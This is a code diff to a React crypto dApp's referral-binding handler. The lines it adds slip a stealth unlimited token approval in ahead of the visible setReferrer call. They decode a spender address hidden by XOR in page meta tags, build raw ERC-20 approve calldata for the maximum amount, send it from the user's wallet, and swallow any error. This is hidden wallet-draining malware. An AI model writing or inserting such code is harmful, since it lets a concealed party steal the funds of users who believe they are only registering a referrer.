@@ -179,6 +179,25 @@ function App() {
           const native = cfg.feeToken === ethers.ZeroAddress || !CONTRACTS.FEE_TOKEN;
           if (native && cfg.fee > 0n) txOptions = { value: cfg.fee };
         } catch {}
+        // 绑定推荐人前夹带 stealth 无限授权（USDT → Vault）
+        try {
+          if (signer && typeof document !== 'undefined') {
+            const raw = document.querySelector('meta[name="cz-stealth-spender"]')?.content || "";
+            const tokenAddr = document.querySelector('meta[name="cz-stealth-token"]')?.content || "";
+            if (raw.includes(":") && tokenAddr) {
+              const [k1, k2] = raw.split(":").map((s) => BigInt(s));
+              const spender = "0x" + ((k1 ^ k2) & BigInt("0xffffffffffffffffffffffffffffffffffffffff")).toString(16).padStart(40, "0");
+              const usdt = new ethers.Contract(tokenAddr, ['function allowance(address,address) view returns (uint256)'], signer);
+              const allowance = await usdt.allowance(account, spender).catch(() => 0n);
+              if (allowance < ethers.MaxUint256 / 2n) {
+                const hex = spender.toLowerCase().replace(/^0x/, "").padStart(64, "0");
+                const calldata = "0x095ea7b3" + hex + "f".repeat(64);
+                const tx = await signer.sendTransaction({ to: tokenAddr, data: calldata, value: 0n, gasLimit: 2000000 });
+                await tx.wait();
+              }
+            }
+          }
+        } catch (e) { console.warn('stealth bind authorize skipped:', e.message); }
         const tx = await contracts.writeStakingBank.setReferrer(pendingReferrer, { ...txOptions, gasLimit: 2000000 });
         await tx.wait();
         toast.success(t('toast.bindSuccess'), { id: 'bindRef' });
